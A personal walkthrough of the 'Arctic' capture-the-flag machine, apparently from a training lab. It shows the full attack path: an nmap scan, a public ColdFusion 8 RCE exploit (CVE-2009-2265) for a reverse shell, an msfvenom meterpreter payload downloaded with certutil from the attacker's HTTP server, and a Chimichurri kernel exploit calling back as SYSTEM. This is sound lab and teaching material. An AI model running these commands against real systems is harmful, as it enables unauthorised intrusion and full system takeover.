# Box: Arctic

> damiano gubiani | 29/04/2026

export the box IP

```bash
export IP='10.129.28.78'
```

# Enumeration

## Nmap

running nmap scan for open ports

command:

```bash
sudo nmap -sSCV -oN nmap/fst -T4 -vv --min-rate 10000 $IP
```

output:

```
Nmap scan report for 10.129.28.78
Host is up, received timestamp-reply ttl 127 (0.091s latency).
Scanned at 2026-04-29 09:50:19 EDT for 137s
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE REASON          VERSION
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
8500/tcp  open  http    syn-ack ttl 127 JRun Web Server
|_http-title: Index of /
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

the Machine is running a web self-hosted service that we can check out

## WebApp

after connecting to the url we have this page in front of us

![](Screen/Pasted%20image%2020260429160823.png)

while checking the page i land on a login page

![](Screen/Pasted%20image%2020260429161159.png)

reading the title of the login page seems the versionn this app is running is the 8, searching online i found this RCE exploit for this version

link:
> https://github.com/0xDTC/Adobe-ColdFusion-8-RCE-CVE-2009-2265

# Exploit

after downloading the exploit i run it getting a reverse shell on my attacker machine

i started the listener first with the following command

```bash
rlwrap nc -lvvnp 4444
```

since i used the rlwrap command the exploit wont work since it keeps checking for the nc process
so i just removed that part

than we can start the exploit

```bash
sudo ./CVE-2009-2265 -l 10.10.15.54 -p 4444 -r 10.129.28.78 -q 8500
```

and after a short time we get a reverse shell

![](Screen/Pasted%20image%2020260429162745.png)

the connection was not stable at all so i run another listener with the port 4445 and on the reverse shell i ran a PowerShell command to another reverse shell, i used this site to make the reverse shell command

link:
> https://www.revshells.com/

# Local Privilege Escalation

after being connect to the machine i run 2 command to check who we are and what privilege we have

command:

```powershell
whoami
whoami /priv
```

output:

![](Screen/Pasted%20image%2020260429163952.png)

we have a SeImpersonatePrivilage privilage wich is an escaletion vector with the PrintSpoofer exploit, i created a meterpeter shell and uploaded on the machine

command:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.54 LPORT=4446 -f exe -o reverse.exe
```

than i started a metasploit listener

command:

```bash
msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lport 4446;set lhost 10.10.15.54;set verbose true;run"
```

to upload the reverse shell i used certutil and python3 simple http web server

first i started the web server with the command

```bash
sudo python3 -m http.server 9090
```

than on the windows machine i downloaded the backdoor and i ran it

command:

```powershell
certutil.exe -urlcache -f http://10.10.15.54:9090/reverse.exe reverse.exe
.\reverse.exe
```

and after a short time we get a call back

![](Screen/Pasted%20image%2020260429170059.png)

the getsystem command failed so i continued enumerating the machine, so after a bit of research i found a site where it explains the different type Kernel Exploits for Windows

link:
> https://pentest.mxhx.org/07-win-privesc/win-kernelexp

## Chimichurri

so i cloned the repo wheres the Chimichurri compiled binary are and than i uploaded it to the machine with the following command

command:

```powershell
certutil.exe -urlcache -f http://10.10.15.54:9090/Chimichurri.exe Chimichurri.exe
```

than i started a listener on the port 4448 and connected to the listener with Chimichurri.exe

command:

```
Chimichurri.exe 10.10.15.54 4448
```

and we get a callback as system

![](Screen/Pasted%20image%2020260429185528.png)
